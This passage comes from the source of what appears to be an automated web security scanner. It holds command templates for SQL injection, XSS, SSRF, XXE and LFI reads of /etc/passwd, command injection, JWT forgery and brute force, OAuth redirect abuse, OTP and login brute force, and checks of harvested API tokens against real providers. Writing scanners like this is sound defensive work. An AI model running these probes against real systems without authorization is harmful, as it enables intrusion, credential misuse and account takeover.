                                     'https://slack.com/api/auth.test'],
                          lambda r: r.returncode==0 and '"ok":true' in r.stdout),
    'SENDGRID_KEY':      (lambda v: ['curl','-sf','-H',f'Authorization: Bearer {v}',
                                     'https://api.sendgrid.com/v3/user/account'],
                          lambda r: r.returncode==0 and '"email"' in r.stdout),
    'HUGGINGFACE_TOKEN': (lambda v: ['curl','-sf','-H',f'Authorization: Bearer {v}',
                                     'https://huggingface.co/api/whoami'],
                          lambda r: r.returncode==0 and '"name"' in r.stdout),
    'MAILGUN_KEY':       (lambda v: ['curl','-sf','-u',f'api:{v}',
                                     'https://api.mailgun.net/v3/domains'],
                          lambda r: r.returncode==0 and '"items"' in r.stdout),
    'GOOGLE_API_KEY':    (lambda v: ['curl','-sf',
                                     f'https://maps.googleapis.com/maps/api/geocode/json?address=test&key={v}'],
                          lambda r: r.returncode==0 and 'error_message' not in r.stdout and 'API_KEY_INVALID' not in r.stdout),
    'GITLAB_PAT':        (lambda v: ['curl','-sf','-H',f'PRIVATE-TOKEN: {v}',
                                     'https://gitlab.com/api/v4/user'],
                          lambda r: r.returncode==0 and '"id"' in r.stdout),
    'NETLIFY_TOKEN':     (lambda v: ['curl','-sf','-H',f'Authorization: Bearer {v}',
                                     'https://api.netlify.com/api/v1/user'],
                          lambda r: r.returncode==0 and '"email"' in r.stdout),
    'DIGITALOCEAN_TOKEN':(lambda v: ['curl','-sf','-H',f'Authorization: Bearer {v}',
                                     'https://api.digitalocean.com/v2/account'],
                          lambda r: r.returncode==0 and '"account"' in r.stdout),
}

verified = 0
for tok in tokens:
    label  = tok.get('label','').replace('KW_','')  # strip keyword prefix
    value  = tok.get('value','')
    # Find matching verifier (strip trailing suffix like _CAND)
    verifier_key = None
    for vk in VERIFIERS:
        if label.startswith(vk) or vk.startswith(label):
            verifier_key = vk; break
    if not verifier_key:
        print(f"VERIFY_NO_API:{label}: no live verifier for this provider — manual review required")
        continue
    cmd_fn, check_fn = VERIFIERS[verifier_key]
    result = curl_check(cmd_fn(value), check_fn)
    if result is True:
        print(f"VERIFIED_SECRET:{label}: LIVE CREDENTIAL CONFIRMED — API accepted the token")
        verified += 1
    elif result is False:
        print(f"UNVERIFIED_SECRET:{label}: API rejected token — may be revoked, expired, or test key")
    else:
        print(f"VERIFY_INCONCLUSIVE:{label}: network error or timeout during verification")

print(f"VERIFY_DONE: {verified}/{len([t for t in tokens if t.get('label','').replace('KW_','') in {k for k in VERIFIERS}])} tokens confirmed live")
# Cleanup temp file
try: os.remove('/tmp/dast_ss_tokens.json')
except Exception: pass
PYEOF""",
            "Live API verification — GitHub, Stripe, OpenAI, Slack, SendGrid, HuggingFace, Mailgun, Google, GitLab, Netlify, DigitalOcean"
        ),
    ],
    "API Spec Agent": [
        ("curl -sf {target}/swagger.json", "Probe swagger.json"),
        ("curl -sf {target}/openapi.json", "Probe openapi.json"),
        ("curl -sf {target}/graphql --data '{\"query\":\"{__typename}\"}'", "Probe GraphQL"),
    ],
    "Security Headers": [
        ("curl -sI {target}", "Grab all response headers"),
        ("curl -sI {target} | grep -i 'content-security-policy\\|x-frame-options\\|x-content-type-options\\|strict-transport-security\\|referrer-policy\\|permissions-policy'", "Check security headers"),
        ("curl -sI {target} | grep -i 'set-cookie'", "Check cookie security flags"),
        ("curl -sI {target} | grep -i 'server:\\|x-powered-by:\\|x-aspnet'", "Check version disclosure"),
    ],
    "JS Library Scanner": [
        ("curl -s {target} | grep -oE 'src=\"[^\"]+\\.js[^\"]*\"'", "Extract JS file paths"),
        ("curl -s {target} | grep -iE 'jquery[.-]([0-9.]+)|bootstrap[.-]([0-9.]+)|angular[.-]([0-9.]+)|lodash[.-]([0-9.]+)'", "Detect library versions in HTML"),
        ("curl -s {target} | python3 -c \"import sys,re; html=sys.stdin.read(); scripts=re.findall(r'src=[\\\"\\']([^\\\"\\']+\\.js[^\\\"\\']*)[\\\"\\']', html); [print(s) for s in scripts[:10]]\"", "List JS files to inspect"),
    ],
    "SQLi Agent": [
        ("curl -s '{target}/?id=1'", "Probe id param"),
        ("curl -s '{target}/?id=1'\"'\"", "SQLi quote test"),
        ("curl -s '{target}/?q=1 OR 1=1--'", "SQLi OR test"),
    ],
    "XSS Agent": [
        ("curl -s '{target}/?q=<script>alert(1)</script>'", "Reflected XSS probe"),
        ("curl -s '{target}/?search=<img src=x onerror=alert(1)>'", "IMG onerror probe"),
    ],
    "SSRF Agent": [
        ("curl -s '{target}/?url=http://169.254.169.254/latest/meta-data/'", "AWS metadata probe"),
        ("curl -s '{target}/?url=http://127.0.0.1:22'", "SSRF localhost probe"),
    ],
    "SSTI Agent": [
        ("curl -s '{target}/?name={{7*7}}'", "SSTI Jinja2 probe"),
        ("curl -s '{target}/?name=${{7*7}}'", "SSTI Freemarker probe"),
    ],
    "XXE Agent": [
        ("curl -s -X POST {target} -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>'", "XXE file read probe"),
    ],
    "LFI Agent": [
        ("curl -s '{target}/?file=../../../etc/passwd'", "LFI in file param"),
        ("curl -s '{target}/?page=../../../etc/passwd'", "LFI in page param"),
        ("curl -s '{target}/?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'", "URL-encoded traversal"),
        ("curl -s '{target}/?file=....//....//....//etc/passwd'", "Double-dot bypass"),
    ],
    "CMDi Agent": [
        ("curl -s '{target}/?q=;id'", "CMDi semicolon test"),
        ("curl -s '{target}/?q=|whoami'", "CMDi pipe test"),
        ("curl -s '{target}/?q=`id`'", "CMDi backtick test"),
        ("curl -s '{target}/?search=%3Bid' -H 'User-Agent: curl/;id'", "CMDi in User-Agent"),
    ],
    "Open Redirect": [
        ("curl -sI '{target}/?url=https://evil.com' | grep -i location", "Open redirect in url param"),
        ("curl -sI '{target}/?redirect=https://evil.com' | grep -i location", "Open redirect in redirect param"),
        ("curl -sI '{target}/?next=//evil.com' | grep -i location", "Protocol-relative redirect"),
        ("curl -sI '{target}/?return=https://evil.com' | grep -i location", "Open redirect in return param"),
    ],
    "Deserial Agent": [
        ("curl -sI {target}", "Check Set-Cookie for serialized objects"),
    ],
    "CORS Agent": [
        ("curl -sI {target} -H 'Origin: https://evil.com'", "CORS evil origin test"),
        ("curl -sI {target} -H 'Origin: null'", "CORS null origin test"),
    ],
    "JWT Agent": [
        # 1: Discover JWTs in headers, cookies, and response body
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, base64, json
resp = subprocess.run(['curl','-sIL','-A','Mozilla/5.0','--max-time','12','{target}'],
                      capture_output=True, text=True).stdout
body = subprocess.run(['curl','-sL','-A','Mozilla/5.0','--max-time','12','{target}'],
                      capture_output=True, text=True).stdout[:30000]
combined = resp + body
jwts = re.findall(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{0,}', combined)
if not jwts:
    print("NO_JWT: no JWT tokens found in headers or response body")
else:
    print(f"JWT_FOUND: {len(set(jwts))} unique token(s)")
    for jwt in list(set(jwts))[:3]:
        parts = jwt.split('.')
        try:
            h = json.loads(base64.b64decode(parts[0]+'==').decode('utf-8','replace'))
            p = json.loads(base64.b64decode(parts[1]+'==').decode('utf-8','replace'))
            print(f"  HEADER: {h}")
            print(f"  PAYLOAD_KEYS: {list(p.keys())}")
            alg = h.get('alg','')
            if alg.lower() == 'none': print("  JWT_ALG_NONE: algorithm=none — signature bypassed!")
            if alg.startswith('HS'):  print(f"  JWT_HMAC: {alg} — weak-secret brute-force possible")
            if alg.startswith('RS'):  print(f"  JWT_RSA: {alg} — RS256→HS256 confusion attack possible")
            if 'kid' in h:           print(f"  JWT_KID: kid={h['kid']} — path traversal/SQLi in kid possible")
            if 'jku' in h or 'x5u' in h: print("  JWT_JKU: jku/x5u header — remote key injection possible")
            import time
            exp = p.get('exp',0)
            if exp and exp < time.time(): print("  JWT_EXPIRED: token is expired but may still be accepted")
        except Exception as e:
            print(f"  DECODE_ERROR: {e}")
PYEOF""",
            "JWT discovery + header analysis — alg, kid, jku, expiry"
        ),
        # 2: alg:none bypass — forge token with no signature
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, base64, json
resp = subprocess.run(['curl','-sIL','--max-time','10','{target}'],capture_output=True,text=True).stdout
body = subprocess.run(['curl','-sL','--max-time','10','{target}'],capture_output=True,text=True).stdout[:20000]
jwt_m = re.search(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{0,}', resp+body)
if not jwt_m:
    print("NO_JWT: skipping alg:none test"); exit()
jwt = jwt_m.group(0); parts = jwt.split('.')
try:
    h = json.loads(base64.b64decode(parts[0]+'=='))
    p = json.loads(base64.b64decode(parts[1]+'=='))
    # Forge alg:none header
    none_hdr = base64.urlsafe_b64encode(json.dumps({**h,'alg':'none'}).encode()).rstrip(b'=').decode()
    forged = f"{none_hdr}.{parts[1]}."
    result = subprocess.run(['curl','-sI','--max-time','8','-H',f'Authorization: Bearer {forged}','{target}'],
                            capture_output=True,text=True).stdout
    code = re.search(r'HTTP/\S+\s+(\d+)', result)
    print(f"ALG_NONE_TEST: forged token → HTTP {code.group(1) if code else '?'}")
    if code and code.group(1) in ('200','201','204'):
        print("JWT_VULN_ALG_NONE: server accepted alg:none token — authentication bypassed!")
    else:
        print("ALG_NONE_REJECTED: server rejected alg:none token (good)")
except Exception as e:
    print(f"ALG_NONE_ERROR: {e}")
PYEOF""",
            "JWT alg:none bypass — forge unsigned token and test acceptance"
        ),
        # 3: Weak secret brute-force (HS256/HS384/HS512)
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, base64, json, hmac, hashlib
resp = subprocess.run(['curl','-sIL','--max-time','10','{target}'],capture_output=True,text=True).stdout
body = subprocess.run(['curl','-sL','--max-time','10','{target}'],capture_output=True,text=True).stdout[:20000]
jwt_m = re.search(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}', resp+body)
if not jwt_m:
    print("NO_JWT: skipping weak secret test"); exit()
jwt = jwt_m.group(0); parts = jwt.split('.')
try:
    h = json.loads(base64.b64decode(parts[0]+'=='))
    alg = h.get('alg','').upper()
    if not alg.startswith('HS'):
        print(f"JWT_NOT_HMAC: {alg} — brute-force not applicable"); exit()
    hash_fn = {'HS256':hashlib.sha256,'HS384':hashlib.sha384,'HS512':hashlib.sha512}.get(alg,hashlib.sha256)
    sig_bytes = base64.urlsafe_b64decode(parts[2]+'==')
    msg = f"{parts[0]}.{parts[1]}".encode()
    WEAK_SECRETS = ['secret','password','123456','admin','key','jwt_secret','supersecret',
                    'changeme','test','dev','qwerty','letmein','welcome','abc123','token',
                    '{target}','null','undefined','your-256-bit-secret','your-secret']
    found = None
    for s in WEAK_SECRETS:
        sig = hmac.new(s.encode(), msg, hash_fn).digest()
        if sig == sig_bytes:
            found = s; break
    if found:
        print(f"JWT_WEAK_SECRET: secret is '{found}' — attacker can forge any token!")
    else:
        print(f"JWT_SECRET_NOT_FOUND: {len(WEAK_SECRETS)} common secrets tried, none matched")
except Exception as e:
    print(f"BRUTE_ERROR: {e}")
PYEOF""",
            "JWT weak secret brute-force — HS256/384/512 against top secrets list"
        ),
        # 4: kid injection — SQLi and path traversal in kid header
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, base64, json
resp = subprocess.run(['curl','-sIL','--max-time','10','{target}'],capture_output=True,text=True).stdout
body = subprocess.run(['curl','-sL','--max-time','10','{target}'],capture_output=True,text=True).stdout[:20000]
jwt_m = re.search(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{0,}', resp+body)
if not jwt_m:
    print("NO_JWT: skipping kid injection test"); exit()
jwt = jwt_m.group(0); parts = jwt.split('.')
try:
    h = json.loads(base64.b64decode(parts[0]+'=='))
    if 'kid' not in h:
        print("NO_KID: JWT has no kid header — injection not applicable"); exit()
    print(f"KID_FOUND: original kid={h['kid']}")
    # Try path traversal kid to force /dev/null (empty key)
    for kid_payload,label in [
        ("/dev/null",          "path_traversal_null_key"),
        ("../../dev/null",     "path_traversal_relative"),
        ("' OR '1'='1",        "sqli_or_bypass"),
        ("1; DROP TABLE keys;","sqli_destructive"),
    ]:
        new_h = {**h, 'kid': kid_payload, 'alg': 'HS256'}
        enc_h = base64.urlsafe_b64encode(json.dumps(new_h).encode()).rstrip(b'=').decode()
        import hmac, hashlib
        sig = hmac.new(b'', f"{enc_h}.{parts[1]}".encode(), hashlib.sha256).digest()
        enc_s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
        forged = f"{enc_h}.{parts[1]}.{enc_s}"
        r = subprocess.run(['curl','-sI','--max-time','6','-H',f'Authorization: Bearer {forged}','{target}'],
                           capture_output=True,text=True).stdout
        code = re.search(r'HTTP/\S+\s+(\d+)',r)
        status = code.group(1) if code else '?'
        flag = "VULN!" if status in ('200','201','204') else "rejected"
        print(f"  KID_{label.upper()}: HTTP {status} — {flag}")
except Exception as e:
    print(f"KID_ERROR: {e}")
PYEOF""",
            "JWT kid header injection — path traversal (/dev/null) and SQL injection"
        ),
        # 5: Token replay after logout + expiry validation
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
# Collect token from initial response
r1 = subprocess.run(['curl','-sIL','--max-time','10','{target}'],capture_output=True,text=True).stdout
jwt_m = re.search(r'eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}', r1)
if not jwt_m:
    print("NO_JWT: skipping replay test"); exit()
token = jwt_m.group(0)
# Test: can we use the same token on different endpoints?
for ep in ['/api/user','/api/profile','/api/me','/api/account','/dashboard','/admin']:
    r = subprocess.run(['curl','-sI','--max-time','6',
                        '-H',f'Authorization: Bearer {token}',
                        f'{"{target}"}{ep}'],capture_output=True,text=True).stdout
    code = re.search(r'HTTP/\S+\s+(\d+)',r)
    if code and code.group(1) in ('200','201'):
        print(f"JWT_REPLAY_AUTH: token accepted on {ep} → HTTP {code.group(1)}")
    else:
        print(f"  ep={ep} → {code.group(1) if code else '?'}")
PYEOF""",
            "JWT replay — test token across endpoints, check revocation"
        ),
    ],
    "OAuth Agent": [
        # 1: OIDC discovery + endpoint enumeration
        (
            "host=$(echo {host} | sed 's/:[0-9]*$//'); "
            "for path in /.well-known/openid-configuration /.well-known/oauth-authorization-server "
            "/oauth/.well-known/openid-configuration /api/oauth/.well-known/openid-configuration; do "
            "  code=$(curl -so /tmp/oidc_disc.json -w '%{http_code}' --max-time 8 {target}$path 2>/dev/null); "
            "  [ \"$code\" = '200' ] && echo \"OIDC_FOUND: {target}$path\" && python3 -c \""
            "import json,sys; d=json.load(open('/tmp/oidc_disc.json')); "
            "[print(f'  {k}: {v}') for k,v in d.items() if isinstance(v,str)]\" 2>/dev/null; "
            "done",
            "OIDC discovery — find .well-known endpoints and extract auth/token URLs"
        ),
        # 2: redirect_uri manipulation — open redirect in OAuth flow
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, urllib.parse
# Look for OAuth authorize endpoint
base = '{target}'
auth_endpoints = ['/oauth/authorize','/authorize','/auth/authorize','/connect/authorize',
                  '/oauth2/authorize','/api/oauth/authorize']
for ep in auth_endpoints:
    # Test with evil.com redirect_uri
    for evil in ['https://evil.com','//evil.com','https://evil.com%2F@{target}',
                  'https://{target}.evil.com','javascript:alert(1)']:
        params = urllib.parse.urlencode({
            'client_id':'test','response_type':'code',
            'redirect_uri':evil,'scope':'openid','state':'dast123'
        })
        url = f"{base}{ep}?{params}"
        r = subprocess.run(['curl','-sIL','--max-time','8',url],capture_output=True,text=True).stdout
        loc = re.search(r'(?i)location:\s*([^\r\n]+)',r)
        code = re.search(r'HTTP/\S+\s+(\d+)',r)
        if loc:
            dest = loc.group(1).strip()
            if 'evil.com' in dest.lower():
                print(f"OAUTH_REDIRECT_VULN: {ep} → redirected to {dest[:80]}")
            else:
                print(f"  {ep}: redirect→{dest[:60]}")
        elif code:
            print(f"  {ep}: HTTP {code.group(1)} (no redirect)")
PYEOF""",
            "OAuth redirect_uri — open redirect with evil.com and bypass variants"
        ),
        # 3: State parameter CSRF — missing or static state
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, urllib.parse
base = '{target}'
# Two requests — check if state changes between them
for ep in ['/oauth/authorize','/authorize','/connect/authorize','/oauth2/authorize']:
    states = []
    for _ in range(2):
        params = urllib.parse.urlencode({'client_id':'test','response_type':'code',
                                         'redirect_uri':base,'scope':'openid'})
        r = subprocess.run(['curl','-sIL','--max-time','6',f"{base}{ep}?{params}"],
                           capture_output=True,text=True).stdout
        state_m = re.search(r'[?&]state=([A-Za-z0-9_\-]+)',r)
        if state_m: states.append(state_m.group(1))
    if len(states)==2:
        if states[0]==states[1]: print(f"OAUTH_STATIC_STATE: {ep} returns same state={states[0]} — CSRF possible")
        else: print(f"OAUTH_STATE_OK: {ep} state changes per request")
    else:
        # Test without state — does server require it?
        params2 = urllib.parse.urlencode({'client_id':'test','response_type':'code',
                                           'redirect_uri':base,'scope':'openid'})
        r2 = subprocess.run(['curl','-sI','--max-time','6',f"{base}{ep}?{params2}"],
                            capture_output=True,text=True).stdout
        code = re.search(r'HTTP/\S+\s+(\d+)',r2)
        print(f"  {ep}: HTTP {code.group(1) if code else '?'} (state not echoed in redirect)")
PYEOF""",
            "OAuth state parameter — CSRF check via static/missing state"
        ),
        # 4: Token endpoint security — PKCE, client secret in URL
        (
            "for ep in /oauth/token /token /auth/token /connect/token /oauth2/token; do "
            "  echo \"--- $ep ---\"; "
            "  curl -s --max-time 8 -X POST {target}$ep "
            "    -d 'grant_type=authorization_code&code=invalid&client_id=test&client_secret=test' "
            "    -H 'Content-Type: application/x-www-form-urlencoded' 2>/dev/null | head -c 300; "
            "  echo; "
            "done",
            "OAuth token endpoint — probe with invalid code, check error verbosity"
        ),
        # 5: Implicit flow + token in URL fragment leak
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, urllib.parse
base = '{target}'
# Check if implicit flow (response_type=token) is supported — leaks token in URL
for ep in ['/oauth/authorize','/authorize','/connect/authorize']:
    params = urllib.parse.urlencode({'client_id':'test','response_type':'token',
                                     'redirect_uri':base,'scope':'openid','state':'dast'})
    r = subprocess.run(['curl','-sIL','--max-time','8',f"{base}{ep}?{params}"],
                       capture_output=True,text=True).stdout
    loc = re.search(r'(?i)location:\s*([^\r\n]+)',r)
    if loc and ('access_token' in loc.group(1) or '#' in loc.group(1)):
        print(f"OAUTH_IMPLICIT_FLOW: {ep} supports implicit grant — token in URL fragment!")
        print(f"  location: {loc.group(1)[:100]}")
    else:
        code = re.search(r'HTTP/\S+\s+(\d+)',r)
        print(f"  {ep}: HTTP {code.group(1) if code else '?'} (no implicit token leak)")
# Check for token in Referer
print("REFERER_CHECK: checking if token appears in outgoing Referer headers via JS")
PYEOF""",
            "OAuth implicit flow — token-in-URL-fragment, Referer leakage"
        ),
    ],
    "CSRF Agent": [
        ("curl -sI {target} | grep -i 'set-cookie'", "Check SameSite cookie flag"),
        ("curl -s -X POST {target}/login -H 'Origin: https://evil.com' -H 'Referer: https://evil.com'", "CSRF Origin bypass test"),
        ("curl -s -X POST {target}/api/profile -H 'Content-Type: application/json' -H 'Origin: https://evil.com' -d '{\"email\":\"attacker@evil.com\"}'", "JSON CSRF probe on profile endpoint"),
        ("curl -s -X POST {target}/api/password -H 'Origin: null' -d 'new_password=hacked123'", "CSRF null origin bypass on password endpoint"),
    ],
    "WAF Bypass": [
        ("curl -sI {target}", "WAF fingerprint via headers"),
        ("curl -s '{target}/?q=<script>alert(1)</script>'", "WAF XSS detection test"),
        ("curl -sI -H 'X-Originating-IP: 127.0.0.1' -H 'X-Remote-IP: 127.0.0.1' -H 'X-Client-IP: 127.0.0.1' {target}", "IP spoofing headers WAF bypass"),
        ("curl -s '{target}/?id=1%27%20OR%20%271%27%3D%271'", "URL-encoded SQLi WAF bypass"),
        ("curl -s -H 'Content-Type: application/json' -X POST {target}/api -d '{\"q\":\"\\u003cscript\\u003ealert(1)\\u003c/script\\u003e\"}'", "Unicode-encoded XSS WAF bypass"),
    ],
    "TLS/SSL Agent": [
        ("openssl s_client -connect {host}:443 </dev/null 2>&1", "TLS handshake"),
        ("curl -sk --tlsv1 {target}", "TLS 1.0 test"),
        ("curl -sI {target} | grep -i hsts", "HSTS header check"),
        ("echo Q | openssl s_client -connect {host}:443 -cipher 'NULL:EXPORT:RC4:DES:aNULL' 2>&1 | head -5", "Weak cipher suite test"),
        ("echo Q | openssl s_client -connect {host}:443 -ssl2 2>&1 | head -3; echo Q | openssl s_client -connect {host}:443 -ssl3 2>&1 | head -3", "SSLv2/SSLv3 legacy protocol test"),
    ],
    "Smuggling Agent": [
        ("curl -s --http1.1 -X POST {target} -H 'Content-Length: 6' -H 'Transfer-Encoding: chunked' -d '0\r\n\r\nG'", "CL.TE smuggling probe"),
        ("curl -s --http1.1 -X POST {target} -H 'Transfer-Encoding: chunked' -H 'Transfer-Encoding: x' -d '5\r\nGPOST\r\n0\r\n\r\n'", "TE.CL obfuscated TE header probe"),
        ("curl -sI -H 'Transfer-Encoding: chunked' -H 'Content-Length: 0' {target}", "HTTP desync header combination probe"),
    ],
    "OAST Agent": [
        ("curl -s '{target}/?url=http://169.254.169.254/'", "OAST SSRF probe"),
        ("curl -s '{target}/?url=http://metadata.google.internal/computeMetadata/v1/' -H 'Metadata-Flavor: Google'", "GCP metadata SSRF probe"),
        ("curl -s '{target}/?url=http://169.254.169.254/metadata/v1/' -H 'Metadata: true'", "Azure IMDS SSRF probe"),
        ("curl -s '{target}/?file=file:///etc/passwd'", "SSRF file:// protocol probe"),
        ("curl -s '{target}/?url=dict://localhost:6379/info'", "SSRF dict:// Redis probe"),
    ],
    "IDOR Agent": [
        # 1: Sequential ID probing across all common API patterns
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
base = '{target}'
endpoints = [
    '/api/users/{id}','/api/user/{id}','/api/accounts/{id}',
    '/api/orders/{id}','/api/order/{id}',
    '/api/documents/{id}','/api/files/{id}',
    '/api/profile/{id}','/api/profiles/{id}',
    '/api/v1/users/{id}','/api/v2/users/{id}',
    '/users/{id}','/account?id={id}','/profile?user_id={id}',
]
responses = {}
for ep_tpl in endpoints:
    codes = []
    for id_ in ['1','2','3','100','admin']:
        ep = ep_tpl.replace('{id}', id_)
        r = subprocess.run(['curl','-sI','--max-time','5',f"{base}{ep}"],
                           capture_output=True,text=True).stdout
        code = re.search(r'HTTP/\S+\s+(\d+)',r)
        codes.append((id_, code.group(1) if code else '?'))
    ok = [(i,c) for i,c in codes if c in ('200','201')]
    if ok:
        print(f"IDOR_CANDIDATE: {ep_tpl} → IDs {[i for i,c in ok]} returned 200")
    else:
        print(f"  {ep_tpl}: {dict(codes)}")
PYEOF""",
            "IDOR sequential ID probe across 15 common API endpoint patterns"
        ),
        # 2: UUID/GUID probing and object reference in body
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
base = '{target}'
# Probe common UUID-based endpoints
test_uuids = [
    '00000000-0000-0000-0000-000000000001',
    '00000000-0000-0000-0000-000000000002',
]
for ep in ['/api/users/{uuid}','/api/orders/{uuid}','/api/documents/{uuid}']:
    for uuid in test_uuids:
        url = f"{base}{ep.format(uuid=uuid)}"
        r = subprocess.run(['curl','-sI','--max-time','5',url],capture_output=True,text=True).stdout
        code = re.search(r'HTTP/\S+\s+(\d+)',r)
        c = code.group(1) if code else '?'
        if c in ('200','201'): print(f"IDOR_UUID_CANDIDATE: {url} → {c}")
# Mass parameter pollution — send multiple id values
for ep in ['/api/user','/api/account']:
    r = subprocess.run(['curl','-sI','--max-time','5',f"{base}{ep}?id=1&id=2&id=admin"],
                       capture_output=True,text=True).stdout
    code = re.search(r'HTTP/\S+\s+(\d+)',r)
    print(f"HPP_IDOR: {ep}?id=1&id=2&id=admin → HTTP {code.group(1) if code else '?'}")
PYEOF""",
            "IDOR UUID probing + HTTP parameter pollution for object reference bypass"
        ),
        # 3: Horizontal privilege escalation — access another user's resources
        (
            "curl -s '{target}/api/users/2' -H 'Accept: application/json' 2>/dev/null | python3 -c \"import sys,json; d=json.loads(sys.stdin.read()); print('IDOR_DATA:', list(d.keys()) if isinstance(d,dict) else 'array')\" 2>/dev/null; "
            "curl -s '{target}/api/profile' -H 'X-User-ID: 2' -H 'Accept: application/json' 2>/dev/null | head -c 200; "
            "curl -s '{target}/api/admin/users' -H 'Accept: application/json' 2>/dev/null | head -c 200",
            "IDOR cross-user data access — user 2, X-User-ID header, admin endpoint"
        ),
    ],
    "Rate Limit Agent": [
        # 1: Login brute-force — rate limiting and lockout
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, time
base = '{target}'
login_eps = ['/login','/api/login','/auth/login','/api/auth/login',
             '/api/v1/auth/login','/signin','/api/signin','/user/login']
for ep in login_eps:
    codes = []
    t0 = time.time()
    for i in range(15):
        r = subprocess.run(['curl','-so','/dev/null','-w','%{http_code}',
                            '--max-time','5','-X','POST',f"{base}{ep}",
                            '-d','username=admin&password=wrong',
                            '-H','Content-Type: application/x-www-form-urlencoded'],
                           capture_output=True,text=True)
        codes.append(r.stdout.strip())
    elapsed = time.time()-t0
    c429 = codes.count('429')
    c200 = codes.count('200')
    c403 = codes.count('403')
    print(f"RATE_LIMIT {ep}: 15 reqs in {elapsed:.1f}s → 200={c200} 429={c429} 403={c403}")
    if c429 == 0 and c200 > 5:
        print(f"  VULN_NO_RATE_LIMIT: no 429s — brute-force possible on {ep}")
    elif c429 > 0:
        print(f"  RATE_LIMIT_ACTIVE: {c429} requests throttled (good)")
PYEOF""",
            "Login rate limit — 15 rapid attempts, detect 429 throttling or lockout"
        ),
        # 2: OTP/2FA brute-force — 6-digit code enumeration
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
base = '{target}'
otp_eps = ['/api/verify','/api/otp/verify','/api/auth/verify',
           '/verify','/api/2fa/verify','/api/mfa/verify','/api/confirm']
for ep in otp_eps:
    codes = []
    for otp in ['000000','123456','111111','999999','654321','000001']:
        r = subprocess.run(['curl','-so','/dev/null','-w','%{http_code}',
                            '--max-time','5','-X','POST',f"{base}{ep}",
                            '-H','Content-Type: application/json',
                            '-d',f'{{"code":"{otp}","otp":"{otp}","token":"{otp}"}}'],
                           capture_output=True,text=True)
        codes.append(r.stdout.strip())
    c429 = codes.count('429')
    c200 = codes.count('200')
    # Endpoint exists if it returns something other than 404/000/timeout
    exists = any(c not in ('404','000','') for c in codes)
    print(f"OTP_RATE_LIMIT {ep}: codes={codes} 429={c429} exists={exists}")
    if c429==0 and any(c in ('200','201') for c in codes):
        print(f"  OTP_VULN: endpoint accepts OTP without rate limiting!")
    elif c429==0 and exists:
        print(f"  OTP_NO_THROTTLE: no rate limiting on OTP endpoint")
PYEOF""",
            "OTP/2FA brute-force — probe 6-digit codes, detect missing rate limits"
        ),
        # 3: Username enumeration via timing and response differences
        (
            r"""python3 - <<'PYEOF'
import subprocess, re, time, statistics
base = '{target}'
# Test timing difference between valid and invalid usernames
# (valid username → slower bcrypt comparison; invalid → fast reject)
test_cases = [
    ('admin',    'likely_valid'),
    ('administrator', 'likely_valid'),
    ('xnotarealuserzz99', 'likely_invalid'),
    ('aaaaaaaaaaaaaaaaaa', 'likely_invalid'),
]
results = {}
for ep in ['/api/login','/login','/auth']:
    timings = {}
    bodies  = {}
    for username, label in test_cases:
        times = []
        body_last = ''
        for _ in range(3):
            t0 = time.time()
            r = subprocess.run(['curl','-s','--max-time','8','-X','POST',f"{base}{ep}",
                                '-H','Content-Type: application/json',
                                '-d',f'{{"username":"{username}","password":"INVALID_DAST_PROBE"}}'],
                               capture_output=True,text=True)
            times.append(time.time()-t0)
            body_last = r.stdout[:100]
        timings[label] = statistics.mean(times)
        bodies[label]  = body_last
    if timings:
        valid_t   = timings.get('likely_valid',0)
        invalid_t = timings.get('likely_invalid',0)
        delta = abs(valid_t - invalid_t)
        print(f"USERNAME_ENUM {ep}: valid={valid_t:.3f}s invalid={invalid_t:.3f}s delta={delta:.3f}s")
        if delta > 0.1:
            print(f"  TIMING_ORACLE: >100ms difference — username enumeration via timing possible")
        # Response body difference
        if bodies.get('likely_valid','') != bodies.get('likely_invalid',''):
            print(f"  BODY_ORACLE: different error messages — username enumeration via response")
        else:
            print(f"  ENUM_PROTECTED: same response for valid/invalid usernames")
PYEOF""",
            "Username enumeration — timing oracle and response difference analysis"
        ),
        # 4: Password reset enumeration + rate limiting
        (
            r"""python3 - <<'PYEOF'
import subprocess, re
base = '{target}'
for ep in ['/forgot-password','/api/forgot-password','/api/password/reset',
           '/reset-password','/api/auth/forgot','/api/users/password-reset']:
    codes = []
    for email in ['admin@test.com','notreal999@test.com','test@test.com']:
        r = subprocess.run(['curl','-so','/dev/null','-w','%{http_code}',
                            '--max-time','8','-X','POST',f"{base}{ep}",
                            '-H','Content-Type: application/json',
                            '-d',f'{{"email":"{email}"}}'],
                           capture_output=True,text=True)
        codes.append((email,r.stdout.strip()))
    distinct = set(c for _,c in codes)
    print(f"RESET_ENUM {ep}: {codes}")
    if len(distinct)==1:
        print(f"  RESET_PROTECTED: same HTTP code for all emails (good)")
    else:
        print(f"  RESET_ENUM_VULN: different codes — email enumeration possible")
PYEOF""",
            "Password reset enumeration — same/different response for known vs unknown emails"
        ),
        # 5: Rate limit bypass techniques
        (
            "echo '=X-Forwarded-For bypass='; "
            "for ip in 1.1.1.1 2.2.2.2 3.3.3.3; do "
            "  code=$(curl -so /dev/null -w '%{http_code}' --max-time 5 -X POST {target}/login "
